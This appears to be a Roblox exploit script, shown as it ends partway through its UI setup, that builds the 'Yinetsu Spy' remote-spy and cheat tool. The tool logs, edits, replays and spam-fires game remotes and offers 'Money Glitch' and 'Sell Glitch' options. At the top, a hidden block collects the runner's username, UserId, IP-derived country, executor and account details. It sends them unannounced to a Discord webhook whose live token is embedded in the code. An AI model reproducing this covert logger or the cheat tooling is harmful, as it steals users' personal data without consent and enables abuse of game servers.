task.spawn(function()
    local WebhookURL = "https://discord.com/api/webhooks/1549390040323326035/nFdb0MwgFuaxpuHQXvKkdYT56iJ-Jqt40IGDVdvdDBcp8s6PDD1QozKOsnJ0a4NwJtVS"

    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local UIS = game:GetService("UserInputService")
    local Stats = game:GetService("Stats")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer

    -- معلومات اللعبة
    local placeName, creatorName = "Unknown", "Unknown"
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        placeName = info.Name
        creatorName = info.Creator.Name
    end)

    -- المنصة
    local platform = "PC"
    if UIS.TouchEnabled and not UIS.KeyboardEnabled then platform = "Mobile"
    elseif UIS.GamepadEnabled then platform = "Console" end

    -- المنفذ
    local executor = "Unknown"
    pcall(function() executor = identifyexecutor() end)

    -- البينغ
    local ping = "N/A"
    pcall(function()
        ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    end)

    -- FPS (قياس سريع لثانية واحدة)
    local fps = 0
    local frames, lastTime = 0, tick()
    local conn = RunService.RenderStepped:Connect(function()
        frames = frames + 1
        if tick() - lastTime >= 1 then
            fps = frames
            frames, lastTime = 0, tick()
        end
    end)
    task.wait(1.1)
    conn:Disconnect()

    -- الدولة (اختياري - يحوي IP)
    local country = "Unknown"
    pcall(function()
        local res = HttpService:GetAsync("https://ipapi.co/json/")
        local d = HttpService:JSONDecode(res)
        country = d.country_name or "Unknown"
    end)

    local embed = {
        ["title"] = "🚀 Script Executed",
        ["color"] = 65280,
        ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"},
        ["fields"] = {
            {["name"] = "👤 User", ["value"] = LocalPlayer.Name, ["inline"] = true},
            {["name"] = "🆔 UserId", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
            {["name"] = "🎮 Place", ["value"] = placeName, ["inline"] = true},
            {["name"] = "🏗️ Creator", ["value"] = creatorName, ["inline"] = true},
            {["name"] = "🆔 PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
            {["name"] = "🌐 ServerId", ["value"] = game.JobId, ["inline"] = false},
            {["name"] = "👥 Players", ["value"] = tostring(#Players:GetPlayers()), ["inline"] = true},
            {["name"] = "📱 Platform", ["value"] = platform, ["inline"] = true},
            {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true},
            {["name"] = "📅 Account Age", ["value"] = tostring(LocalPlayer.AccountAge).." days", ["inline"] = true},
            {["name"] = "💎 Premium", ["value"] = tostring(LocalPlayer.MembershipType == Enum.MembershipType.Premium), ["inline"] = true},
            {["name"] = "📶 Ping", ["value"] = tostring(ping).." ms", ["inline"] = true},
            {["name"] = "🖥️ FPS", ["value"] = tostring(fps), ["inline"] = true},
            {["name"] = "🌍 Country", ["value"] = country, ["inline"] = true},
            {["name"] = "⏰ Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false},
        },
        ["footer"] = {["text"] = "Execution Log"}
    }

    local req = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
    if req then
        pcall(function()
            req({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({["embeds"] = {embed}})
            })
        end)
    end
end)


if getgenv().YinetsuExecuted then return end
getgenv().YinetsuExecuted = true
getgenv().YinetsuUIActive = true  -- flag for background loops

-- [[ SERVICES ]]
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local VirtualUser = game:GetService("VirtualUser")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- [[ 1. YINETSU EDITOR BRAIN (AI ASSISTED) ]]
local function yinetsuBeautify(v, indent, visited)
    indent = indent or 0
    visited = visited or {}
    if visited[v] then return "recursive_table" end
    visited[v] = true
    local spacing = string.rep(" ", indent)
    local t = typeof(v)
    if t == "number" or t == "boolean" then
        return tostring(v)
    elseif t == "string" then
        return '"' .. v:gsub('"', '\\"') .. '"'
    elseif t == "Vector3" then
        return "Vector3.new("..tostring(v)..")"
    elseif t == "Vector2" then
        return "Vector2.new("..tostring(v)..")"
    elseif t == "CFrame" then
        return "CFrame.new("..tostring(v)..")"
    elseif t == "Color3" then
        return "Color3.new("..tostring(v)..")"
    elseif t == "UDim2" then
        return "UDim2.new("..tostring(v)..")"
    elseif t == "EnumItem" then
        return tostring(v)
    elseif t == "Instance" then
        return v:GetFullName()
    elseif t == "table" then
        local s = "{\n"
        local count = 0
        for k, val in next, v do
            count = count + 1
            s = s .. spacing .. " [" .. yinetsuBeautify(k, indent+1, visited) .. "] = " .. yinetsuBeautify(val, indent+1, visited) .. ",\n"
        end
        return count == 0 and "{}" or s .. spacing .. "}"
    else
        return "nil"
    end
end

-- [[ 2. V3 SERIALIZER ]]
local function v2s(v, visited)
    visited = visited or {}
    if visited[v] then return "recursive_table" end
    visited[v] = true
    local t = typeof(v)
    if t == "number" or t == "boolean" then
        return tostring(v)
    elseif t == "string" then
        return '"' .. v:gsub('"', '\\"') .. '"'
    elseif t == "Vector3" then
        return "Vector3.new("..tostring(v)..")"
    elseif t == "Vector2" then
        return "Vector2.new("..tostring(v)..")"
    elseif t == "CFrame" then
        return "CFrame.new("..tostring(v)..")"
    elseif t == "Color3" then
        return "Color3.new("..tostring(v)..")"
    elseif t == "EnumItem" then
        return tostring(v)
    elseif t == "Instance" then
        return v:GetFullName()
    elseif t == "table" then
        local s = "{"
        for k, val in next, v do
            s = s .. "[" .. v2s(k, visited) .. "] = " .. v2s(val, visited) .. ", "
        end
        return s:sub(1, #s-2) .. "}"
    end
    return "nil"
end

-- [[ VARIABLES ]]
local selectedRemote = nil
local selectedArgs = {}
local multiList = {}
local multiMode = false
local scheduled = {}
local blacklist = {}
local blocklist = {}
local looping = false
local autoClear = false
local spamBlock = false
local spamCount = {}
local recording = false
local recordedSeq = {}          -- with size limit
local sniperMode = false
local modifierActive = false
local modTarget = ""
local modReplace = ""

-- [[ NEW CHEAT VARS & OPTIMIZED MODIFIER CACHE ]]
local negateActive = false
local multActive = false
local cachedModTarget = ""      -- optimized: updated only when typing
local cachedModReplace = ""
local layoutOrderNum = 999999999
local remoteLogs = {}
local MAX_LOGS = 300
local logQueue = {}             -- queue to manage oldest logs

-- [[ FILE SYSTEM SETUP ]]
local gPath = "Yinetsu_Logs/" .. tostring(game.GameId)
local autoLoadPath = gPath .. "/_autoload.json"
local function ensureFolder()
    if not isfolder("Yinetsu_Logs") then makefolder("Yinetsu_Logs") end
    if not isfolder(gPath) then makefolder(gPath) end
end
ensureFolder()

-- [[ UI SETUP ]]
local FloatUI = Instance.new("ScreenGui", CoreGui)
FloatUI.Name = "YinetsuFloat"
FloatUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
local ToggleBtn = Instance.new("TextButton", FloatUI)
ToggleBtn.Size = UDim2.new(0, 45, 0, 45)
ToggleBtn.Position = UDim2.new(0, 10, 0.5, 0)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
ToggleBtn.Text = "Y"
ToggleBtn.TextColor3 = Color3.new(1, 1, 1)
ToggleBtn.Draggable = true
Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(1, 0)
local ToggleStroke = Instance.new("UIStroke", ToggleBtn)
ToggleStroke.Thickness = 2
ToggleStroke.Color = Color3.fromRGB(0, 255, 255)

-- [[ NEW: Editor Floating Icon ]]
local ToggleEdBtn = Instance.new("TextButton", FloatUI)
ToggleEdBtn.Size = UDim2.new(0, 45, 0, 45)
ToggleEdBtn.Position = UDim2.new(0, 65, 0.5, 0)
ToggleEdBtn.BackgroundColor3 = Color3.fromRGB(15, 5, 20)
ToggleEdBtn.Text = "E"
ToggleEdBtn.TextColor3 = Color3.fromRGB(180, 100, 255)
ToggleEdBtn.Draggable = true
ToggleEdBtn.Visible = false  -- initially hidden, toggle via button
Instance.new("UICorner", ToggleEdBtn).CornerRadius = UDim.new(1, 0)
local ToggleEdStroke = Instance.new("UIStroke", ToggleEdBtn)
ToggleEdStroke.Thickness = 2
ToggleEdStroke.Color = Color3.fromRGB(180, 100, 255)

local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "YinetsuMain"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 420, 0, 340)
Main.Position = UDim2.new(0.5, -210, 0.5, -170)
Main.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
Main.Active = true
Main.Draggable = true
Instance.new("UICorner", Main)
local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Thickness = 2
MainStroke.Color = Color3.fromRGB(0, 255, 255)

local Title = Instance.new("TextLabel", Main)
Title.Text = " YINETSU SPY"
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(0, 200, 255)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Font = Enum.Font.GothamBold
Title.TextSize = 12

-- [[ 3. THE YINETSU EDITOR UI (MULTI-PAGE & BACKGROUND LOOPS) ]]
local EditorMain = Instance.new("Frame", ScreenGui)
EditorMain.Name = "YinetsuEditor"
EditorMain.Size = UDim2.new(0, 300, 0, 380)
EditorMain.Position = UDim2.new(0.5, 220, 0.5, -190)
EditorMain.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
EditorMain.Visible = false
EditorMain.Active = true
EditorMain.Draggable = true
Instance.new("UICorner", EditorMain)
local EdStroke = Instance.new("UIStroke", EditorMain)
EdStroke.Color = Color3.fromRGB(180, 100, 255)
EdStroke.Thickness = 2

local EdTitle = Instance.new("TextLabel", EditorMain)
EdTitle.Size = UDim2.new(1, 0, 0, 30)
EdTitle.Text = " YINETSU EDITOR"
EdTitle.TextColor3 = Color3.fromRGB(180, 100, 255)
EdTitle.BackgroundTransparency = 1
EdTitle.Font = Enum.Font.GothamBold

local EdBox = Instance.new("TextBox", EditorMain)
EdBox.Size = UDim2.new(0.9, 0, 0.4, 0)
EdBox.Position = UDim2.new(0.05, 0, 0.1, 0)
EdBox.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
EdBox.Text = "{}"
EdBox.TextColor3 = Color3.fromRGB(0, 255, 150)
EdBox.TextSize = 10
EdBox.MultiLine = true
EdBox.ClearTextOnFocus = false
EdBox.TextXAlignment = Enum.TextXAlignment.Left
EdBox.TextYAlignment = Enum.TextYAlignment.Top
Instance.new("UICorner", EdBox)

local function createEdBtn(txt, pos, col, parent)
    local b = Instance.new("TextButton", parent or EditorMain)
    b.Size = UDim2.new(0.42, 0, 0, 30)
    b.Position = pos
    b.Text = txt
    b.BackgroundColor3 = col
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    b.TextSize = 9
    Instance.new("UICorner", b)
    return b
end

local btnRun = createEdBtn("RUN CODE", UDim2.new(0.05, 0, 0.52, 0), Color3.fromRGB(0, 200, 100))
local btnTemplates = createEdBtn("TEMPLATES (AI)", UDim2.new(0.53, 0, 0.52, 0), Color3.fromRGB(255, 150, 0))
local btnBeauty = createEdBtn("BEAUTIFY", UDim2.new(0.05, 0, 0.62, 0), Color3.fromRGB(60, 150, 180))
local btnMinify = createEdBtn("MINIFY", UDim2.new(0.53, 0, 0.62, 0), Color3.fromRGB(100, 100, 100))

-- Editor Loop & Pagination (NEW)
local LoopEdFrame = Instance.new("Frame", EditorMain)
LoopEdFrame.Size = UDim2.new(0.9, 0, 0, 30)
LoopEdFrame.Position = UDim2.new(0.05, 0, 0.72, 0)
LoopEdFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
Instance.new("UICorner", LoopEdFrame)

local btnLoopRun = Instance.new("TextButton", LoopEdFrame)
btnLoopRun.Size = UDim2.new(0.7, 0, 1, 0)
btnLoopRun.BackgroundTransparency = 1
btnLoopRun.Text = "LOOP PAGE: OFF"
btnLoopRun.TextColor3 = Color3.new(1,1,1)

local inputSpeedEd = Instance.new("TextBox", LoopEdFrame)
inputSpeedEd.Size = UDim2.new(0.25, 0, 0.8, 0)
inputSpeedEd.Position = UDim2.new(0.72, 0, 0.1, 0)
inputSpeedEd.Text = "0.1"
inputSpeedEd.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
inputSpeedEd.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", inputSpeedEd)

-- Page Controls (NEW)
local PageFrame = Instance.new("Frame", EditorMain)
PageFrame.Size = UDim2.new(0.9, 0, 0, 30)
PageFrame.Position = UDim2.new(0.05, 0, 0.81, 0)
PageFrame.BackgroundTransparency = 1

local btnPrevPage = createEdBtn("<", UDim2.new(0, 0, 0, 0), Color3.fromRGB(40, 40, 50), PageFrame)
btnPrevPage.Size = UDim2.new(0.2, 0, 1, 0)
local btnNextPage = createEdBtn(">", UDim2.new(0.8, 0, 0, 0), Color3.fromRGB(40, 40, 50), PageFrame)
btnNextPage.Size = UDim2.new(0.2, 0, 1, 0)
local lblPage = Instance.new("TextLabel", PageFrame)
lblPage.Size = UDim2.new(0.6, 0, 1, 0)
lblPage.Position = UDim2.new(0.2, 0, 0, 0)
lblPage.BackgroundTransparency = 1
lblPage.Text = "PAGE: 1"
lblPage.TextColor3 = Color3.new(1,1,1)
lblPage.Font = Enum.Font.GothamBold

local btnCloseEd = createEdBtn("CLOSE EDITOR", UDim2.new(0.05, 0, 0.90, 0), Color3.fromRGB(150, 40, 40))
btnCloseEd.Size = UDim2.new(0.9, 0, 0, 30)

-- Page Logic (NEW)
local editorPages = {}
local currentPage = 1

local function initPage(p)
    if not editorPages[p] then
        editorPages[p] = { text = "{}", looping = false, speed = 0.1 }
    end
end
initPage(1)

local function updatePageUI()
    lblPage.Text = "PAGE: " .. currentPage
    EdBox.Text = editorPages[currentPage].text
    inputSpeedEd.Text = tostring(editorPages[currentPage].speed)
    btnLoopRun.Text = editorPages[currentPage].looping and "LOOP PAGE: ON" or "LOOP PAGE: OFF"
    btnLoopRun.TextColor3 = editorPages[currentPage].looping and Color3.fromRGB(0, 255, 100) or Color3.new(1,1,1)
end

EdBox:GetPropertyChangedSignal("Text"):Connect(function()
    editorPages[currentPage].text = EdBox.Text
end)
inputSpeedEd:GetPropertyChangedSignal("Text"):Connect(function()
    editorPages[currentPage].speed = tonumber(inputSpeedEd.Text) or 0.1
end)

btnPrevPage.MouseButton1Click:Connect(function()
    if currentPage > 1 then currentPage = currentPage - 1; updatePageUI() end
end)
btnNextPage.MouseButton1Click:Connect(function()
    currentPage = currentPage + 1; initPage(currentPage); updatePageUI()
end)

-- Execute Editor Logic
local function fireEdCode(codeText)
    if not selectedRemote or not selectedRemote.Parent then return end
    local s, res = pcall(function() return loadstring("return "..codeText)() end)
    if s and typeof(res) == "table" then
        if selectedRemote.ClassName == "RemoteEvent" then
            selectedRemote:FireServer(unpack(res))
        else
            local ret = {selectedRemote:InvokeServer(unpack(res))}
            getgenv().LastReturn = ret
            CodeView.Text = "-- [[ SERVER RETURN DATA ]]\n" .. yinetsuBeautify(ret)
        end
    end
end

btnRun.MouseButton1Click:Connect(function() fireEdCode(EdBox.Text) end)

-- Asynchronous Multi-Threaded Editor Loops (NEW)
btnLoopRun.MouseButton1Click:Connect(function()
    local pg = currentPage
    editorPages[pg].looping = not editorPages[pg].looping
    updatePageUI()
    if editorPages[pg].looping then
        task.spawn(function()
            while editorPages[pg].looping and getgenv().YinetsuUIActive do
                fireEdCode(editorPages[pg].text)
                task.wait(editorPages[pg].speed)
            end
        end)
    end
end)

-- AI Templates
local templateIndex = 1
local templates = {
    {name = "WalkSpeed Cheat", code = "{[1] = 'Speed', [2] = 100}"},
    {name = "Teleport Arg", code = "{[1] = CFrame.new(0, 100, 0)}"},
    {name = "Kill Aura", code = "{[1] = 'Hit', [2] = workspace.Enemy}"},
    {name = "God Mode Args", code = "{[1] = true, [2] = 'GodMode'}"},
    {name = "Reset", code = "{}"}
}
btnTemplates.MouseButton1Click:Connect(function()
    templateIndex = templateIndex % #templates + 1
    btnTemplates.Text = templates[templateIndex].name
    EdBox.Text = templates[templateIndex].code
end)

btnBeauty.MouseButton1Click:Connect(function()
    local s, res = pcall(function() return loadstring("return "..EdBox.Text)() end)
    if s and typeof(res) == "table" then EdBox.Text = yinetsuBeautify(res) end
end)

btnMinify.MouseButton1Click:Connect(function()
    local s, res = pcall(function() return loadstring("return "..EdBox.Text)() end)
    if s and typeof(res) == "table" then EdBox.Text = v2s(res) end
end)

btnCloseEd.MouseButton1Click:Connect(function() EditorMain.Visible = false end)
ToggleEdBtn.MouseButton1Click:Connect(function() EditorMain.Visible = not EditorMain.Visible end)

-- [[ CONTEXT MENU & FILES ]]
local bDots = Instance.new("TextButton", Main)
bDots.Size = UDim2.new(0, 30, 0, 20)
bDots.Position = UDim2.new(1, -35, 0, 5)
bDots.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
bDots.Text = "..."
bDots.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", bDots)

local FileMenu = Instance.new("Frame", Main)
FileMenu.Size = UDim2.new(0, 160, 0, 200)
FileMenu.Position = UDim2.new(1, 10, 0, 0)
FileMenu.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
FileMenu.Visible = false
FileMenu.ZIndex = 50
Instance.new("UICorner", FileMenu)
local FileStroke = Instance.new("UIStroke", FileMenu)
FileStroke.Color = Color3.fromRGB(0, 255, 255)

local FileHeader = Instance.new("TextLabel", FileMenu)
FileHeader.Size = UDim2.new(1, 0, 0, 25)
FileHeader.Text = "Saved Files"
FileHeader.TextColor3 = Color3.fromRGB(0, 200, 255)
FileHeader.BackgroundTransparency = 1
FileHeader.ZIndex = 51

local FileScroll = Instance.new("ScrollingFrame", FileMenu)
FileScroll.Size = UDim2.new(1, -10, 1, -35)
FileScroll.Position = UDim2.new(0, 5, 0, 30)
FileScroll.BackgroundTransparency = 1
FileScroll.ScrollBarThickness = 2
FileScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
FileScroll.ZIndex = 51

local FileLayout = Instance.new("UIListLayout", FileScroll)
FileLayout.Padding = UDim.new(0, 5)

local ContextFrame = Instance.new("Frame", Main)
ContextFrame.Size = UDim2.new(0, 120, 0, 135)
ContextFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
ContextFrame.Visible = false
ContextFrame.ZIndex = 60
Instance.new("UICorner", ContextFrame)
local CtxLayout = Instance.new("UIListLayout", ContextFrame)
CtxLayout.Padding = UDim.new(0, 2)

local function makeCtxBtn(txt, col)
    local b = Instance.new("TextButton", ContextFrame)
    b.Size = UDim2.new(1, 0, 0, 30)
    b.Text = txt
    b.BackgroundColor3 = col
    b.TextColor3 = Color3.new(1,1,1)
    b.TextSize = 9
    b.ZIndex = 61
    return b
end

local btnLoad = makeCtxBtn("Load File", Color3.fromRGB(40,40,40))
local btnAuto = makeCtxBtn("Set Auto-Load", Color3.fromRGB(40,40,100))
local btnDel = makeCtxBtn("Delete File", Color3.fromRGB(150,40,40))
local btnScan = makeCtxBtn("Scan IDs (AI)", Color3.fromRGB(255, 100, 0))

-- SEARCHBAR
local SearchBar = Instance.new("TextBox", Main)
SearchBar.Size = UDim2.new(0.38, -10, 0, 25)
SearchBar.Position = UDim2.new(0, 5, 0, 30)
SearchBar.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
SearchBar.PlaceholderText = "Search..."
SearchBar.Text = ""
SearchBar.TextColor3 = Color3.new(1, 1, 1)
SearchBar.TextSize = 10
Instance.new("UICorner", SearchBar)

-- LOG SCROLL
local LogFrame = Instance.new("ScrollingFrame", Main)
LogFrame.Size = UDim2.new(0.38, 0, 1, -125)
LogFrame.Position = UDim2.new(0, 5, 0, 60)
LogFrame.BackgroundTransparency = 1
LogFrame.ScrollBarThickness = 2
local LogLayout = Instance.new("UIListLayout", LogFrame)
LogLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- MODIFIER UI AREA (OPTIMIZED with caching)
local ModFrame = Instance.new("Frame", Main)
ModFrame.Size = UDim2.new(0.38, 0, 0, 35)
ModFrame.Position = UDim2.new(0, 5, 1, -40)
ModFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
Instance.new("UICorner", ModFrame)

local modTargetBox = Instance.new("TextBox", ModFrame)
modTargetBox.Size = UDim2.new(0.3, 0, 0.8, 0)
modTargetBox.Position = UDim2.new(0.05, 0, 0.1, 0)
modTargetBox.PlaceholderText = "Find"
modTargetBox.Text = ""
modTargetBox.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
modTargetBox.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", modTargetBox)

local modReplaceBox = Instance.new("TextBox", ModFrame)
modReplaceBox.Size = UDim2.new(0.3, 0, 0.8, 0)
modReplaceBox.Position = UDim2.new(0.38, 0, 0.1, 0)
modReplaceBox.PlaceholderText = "Set"
modReplaceBox.Text = ""
modReplaceBox.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
modReplaceBox.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", modReplaceBox)

-- Network Optimization: Update cached vars ONLY when typed (NEW)
modTargetBox:GetPropertyChangedSignal("Text"):Connect(function() cachedModTarget = modTargetBox.Text end)
modReplaceBox:GetPropertyChangedSignal("Text"):Connect(function() cachedModReplace = modReplaceBox.Text end)

local bModToggle = Instance.new("TextButton", ModFrame)
bModToggle.Size = UDim2.new(0.25, 0, 0.8, 0)
bModToggle.Position = UDim2.new(0.72, 0, 0.1, 0)
bModToggle.Text = "MOD: OFF"
bModToggle.BackgroundColor3 = Color3.fromRGB(150, 40, 40)
bModToggle.TextColor3 = Color3.new(1,1,1)
bModToggle.TextSize = 8
Instance.new("UICorner", bModToggle)

-- [[ CHEAT MENU UI ]]
local CheatFrame = Instance.new("Frame", ScreenGui)
CheatFrame.Name = "YinetsuCheats"
CheatFrame.Size = UDim2.new(0, 250, 0, 200)
CheatFrame.Position = UDim2.new(0.5, 230, 0.5, 0)
CheatFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
CheatFrame.Visible = false
CheatFrame.Active = true
CheatFrame.Draggable = true
Instance.new("UICorner", CheatFrame)
local CheatStroke = Instance.new("UIStroke", CheatFrame)
CheatStroke.Color = Color3.fromRGB(255, 50, 255)
CheatStroke.Thickness = 2

local CheatTitle = Instance.new("TextLabel", CheatFrame)
CheatTitle.Size = UDim2.new(1, 0, 0, 30)
CheatTitle.Text = " YINETSU CHEATS"
CheatTitle.TextColor3 = Color3.fromRGB(255, 50, 255)
CheatTitle.Font = Enum.Font.GothamBold
CheatTitle.TextXAlignment = Enum.TextXAlignment.Left
CheatTitle.BackgroundTransparency = 1

local function createCheatBtn(txt, pos, col)
    local b = Instance.new("TextButton", CheatFrame)
    b.Size = UDim2.new(0.9, 0, 0, 30)
    b.Position = pos
    b.Text = txt
    b.BackgroundColor3 = col
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.GothamBold
    Instance.new("UICorner", b)
    return b
end

local bNegate = createCheatBtn("NEGATE ARGS (Money Glitch)", UDim2.new(0.05, 0, 0.2, 0), Color3.fromRGB(50, 50, 60))
local bMultiply = createCheatBtn("MULTIPLY x9999 (Sell Glitch)", UDim2.new(0.05, 0, 0.4, 0), Color3.fromRGB(50, 50, 60))
local bScanner = createCheatBtn("SCAN REWARD REMOTES", UDim2.new(0.05, 0, 0.6, 0), Color3.fromRGB(200, 100, 0))
local bCloseCheats = createCheatBtn("CLOSE", UDim2.new(0.05, 0, 0.8, 0), Color3.fromRGB(150, 40, 40))

-- BUTTON SCROLL (MAIN GRID) with SPEED-ADJUSTABLE CONTAINERS (NEW)
local ButtonScroll = Instance.new("ScrollingFrame", Main)
ButtonScroll.Size = UDim2.new(0.58, 0, 0.45, 0)
ButtonScroll.Position = UDim2.new(0.4, 5, 0.45, 10)
ButtonScroll.BackgroundTransparency = 1
ButtonScroll.ScrollBarThickness = 2
ButtonScroll.CanvasSize = UDim2.new(0, 0, 0, 600)
local Grid = Instance.new("UIGridLayout", ButtonScroll)
Grid.CellSize = UDim2.new(0, 75, 0, 28)

local function createGridBtn(txt, color)
    local b = Instance.new("TextButton", ButtonScroll)
    b.Text = txt
    b.BackgroundColor3 = color or Color3.fromRGB(30, 30, 35)
    b.TextColor3 = Color3.new(1, 1, 1)
    b.TextSize = 8
    Instance.new("UICorner", b)
    return b
end

-- Helper for speed containers (NEW)
local function createSpeedContainer(btnText, defaultSpeed, color)
    local frame = Instance.new("Frame", ButtonScroll)
    frame.BackgroundColor3 = color
    frame.Size = UDim2.new(0, 75, 0, 28)
    Instance.new("UICorner", frame)
    local btn = Instance.new("TextButton", frame)
    btn.Size = UDim2.new(0.65, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = btnText
    btn.TextColor3 = Color3.new(1,1,1)
    btn.TextSize = 8
    local box = Instance.new("TextBox", frame)
    box.Size = UDim2.new(0.35, 0, 0.8, 0)
    box.Position = UDim2.new(0.6, 0, 0.1, 0)
    box.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    box.Text = tostring(defaultSpeed)
    box.TextColor3 = Color3.new(1,1,1)
    box.TextSize = 7
    Instance.new("UICorner", box)
    return btn, box
end

-- Grid Buttons (some are speed containers)
local bOpenEd = createGridBtn("OPEN EDITOR", Color3.fromRGB(180, 100, 255))
local bToggleEBtn = createGridBtn("Editor Icon: OFF", Color3.fromRGB(100, 50, 150))
local bCheatMenu = createGridBtn("CHEAT MENU", Color3.fromRGB(255, 50, 255))
local b3 = createGridBtn("Run Code", Color3.fromRGB(0, 200, 100))
local bSniper = createGridBtn("Sniper: OFF", Color3.fromRGB(255, 0, 255))
local b1 = createGridBtn("Copy Code")
local b6 = createGridBtn("Clr Logs", Color3.fromRGB(120, 40, 40))
local bBlockSpam = createGridBtn("Block Spam", Color3.fromRGB(200, 100, 0))
local bClearFilters = createGridBtn("Reset Filters", Color3.fromRGB(150, 80, 40))
local bSpam50 = createGridBtn("Spam 50x", Color3.fromRGB(255, 50, 50))
local bRecord = createGridBtn("Rec Seq", Color3.fromRGB(255, 100, 100))
local bPlaySeq, SeqSpeedBox = createSpeedContainer("Play Seq", 0.1, Color3.fromRGB(100, 255, 100))
local bMakeScript = createGridBtn("Make Script", Color3.fromRGB(255, 215, 0))
local b7 = createGridBtn("Exclude (i)")
local b8 = createGridBtn("Exclude (n)")
local b10 = createGridBtn("Block (i)")
local b11 = createGridBtn("Block (n)")
local bDecompile = createGridBtn("Decompiler+", Color3.fromRGB(70, 30, 100))
local bSaveFile = createGridBtn("Save File", Color3.fromRGB(0, 120, 200))
local bMulti = createGridBtn("Multi Code", Color3.fromRGB(50, 50, 60))
local bClearMulti = createGridBtn("Clear Multi", Color3.fromRGB(100, 30, 30))
local b2 = createGridBtn("Copy Path")
local b4 = createGridBtn("Get Script")
local b5 = createGridBtn("Func Info")
local bYT = createGridBtn("YouTube", Color3.fromRGB(200, 0, 0))
local b12 = createGridBtn("Destroy UI", Color3.fromRGB(60, 60, 65))
local bScanAll = createGridBtn("Scan All", Color3.fromRGB(0, 150, 255))
local bRunAllLogs = createGridBtn("Run All Logs", Color3.fromRGB(255, 100, 0))

-- Speed containers for Loop and Loop Clr
local b9, SpeedBox = createSpeedContainer("Loop", 0.1, Color3.fromRGB(40, 120, 40))
local b13, ClearSpeedBox = createSpeedContainer("Loop Clr", 1.0, Color3.fromRGB(150, 50, 50))

-- SAVE POPUP
local SavePopup = Instance.new("Frame", ScreenGui)
SavePopup.Size = UDim2.new(0, 220, 0, 120)
SavePopup.Position = UDim2.new(0.5, -110, 0.5, -60)
SavePopup.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
SavePopup.Visible = false
SavePopup.ZIndex = 100
Instance.new("UICorner", SavePopup)

local SaveIn = Instance.new("TextBox", SavePopup)
SaveIn.Size = UDim2.new(0.9, 0, 0, 30)
SaveIn.Position = UDim2.new(0.05, 0, 0.2, 0)
SaveIn.PlaceholderText = "Enter Filename..."
SaveIn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
SaveIn.TextColor3 = Color3.new(1,1,1)
SaveIn.ZIndex = 101
Instance.new("UICorner", SaveIn)

local SaveDone = Instance.new("TextButton", SavePopup)
SaveDone.Size = UDim2.new(0.43, 0, 0, 30)
SaveDone.Position = UDim2.new(0.52, 0, 0.6, 0)
SaveDone.Text = "DONE"
SaveDone.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
SaveDone.TextColor3 = Color3.new(1,1,1)
SaveDone.ZIndex = 101
Instance.new("UICorner", SaveDone)

local SaveBack = Instance.new("TextButton", SavePopup)
SaveBack.Size = UDim2.new(0.43, 0, 0, 30)
SaveBack.Position = UDim2.new(0.05, 0, 0.6, 0)
SaveBack.Text = "BACK"
SaveBack.BackgroundColor3 = Color3.fromRGB(100, 30, 30)
SaveBack.TextColor3 = Color3.new(1,1,1)
SaveBack.ZIndex = 101
Instance.new("UICorner", SaveBack)

-- CODE VIEW UI
local CodeContainer = Instance.new("ScrollingFrame", Main)
CodeContainer.Name = "CodeContainer"
CodeContainer.Size = UDim2.new(0.58, 0, 0.4, 0)
CodeContainer.Position = UDim2.new(0.4, 5, 0, 30)
CodeContainer.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
CodeContainer.ScrollBarThickness = 3
CodeContainer.AutomaticCanvasSize = Enum.AutomaticSize.XY
Instance.new("UICorner", CodeContainer)

local CodeStroke = Instance.new("UIStroke", CodeContainer)
CodeStroke.Color = Color3.fromRGB(0, 160, 255)

